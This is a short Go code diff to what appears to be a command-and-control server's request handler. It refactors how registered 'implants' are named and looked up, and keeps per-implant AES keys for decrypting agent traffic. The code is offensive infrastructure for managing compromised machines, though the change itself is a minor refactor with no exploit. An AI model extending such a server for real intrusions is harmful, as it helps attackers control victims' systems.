@@ -55,7 +55,7 @@ func ProcessRequest(c *gin.Context) {
 
 		//check if implant is already registered
 		for _, agent := range agent_arr {
-			if agent.ImplantName == data_package.AgentName {
+			if agent.Context.Agent_name == data_package.AgentName {
 				if agent.AESKey != nil && agent.IV != nil && agent.Context.User_name != "" {
 					log.Println("[info] implant already registered")
 					c.JSON(http.StatusOK, "")
@@ -82,12 +82,13 @@ func ProcessRequest(c *gin.Context) {
 				c.JSON(http.StatusInternalServerError, "Internal Server Error")
 			}
 			NewImplant = &Common.Implant{
-				ImplantName: data_package.AgentName,
-				AESKey:      AESKey,
-				IV:          IV,
-				Alive:       true,
-				Context:     Common.ImplantContext{},
+				AESKey:  AESKey,
+				IV:      IV,
+				Alive:   true,
+				Context: Common.ImplantContext{},
 			}
+			//set the agent name before we add it to our array b/c it's part of the header package and not dedcrypted data.
+			NewImplant.Context.Agent_name = data_package.AgentName
 
 			agent_arr = append(agent_arr, NewImplant)
 
@@ -115,14 +116,14 @@ func ProcessRequest(c *gin.Context) {
 		err = data_package.UnmarshalEncryptedData(body)
 		if err == nil {
 			for _, agent := range agent_arr {
-				if agent.ImplantName == data_package.AgentName {
+				if agent.Context.Agent_name == data_package.AgentName {
 					//TODO DO SOMETHING WITH DECRYPTED DATA
 					decryptedPayload = Crypt.AES256CTR(data_package.EncryptedData, agent.AESKey, agent.IV)
 					break
 				}
 			}
 
-		} else if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
+		} else if err.Error() != "[error] insufficient data for package unmarshalling" {
 			log.Println("[error] attempting to unmarshal header", err)
 			c.JSON(http.StatusInternalServerError, "Internal Server Error")
 		}
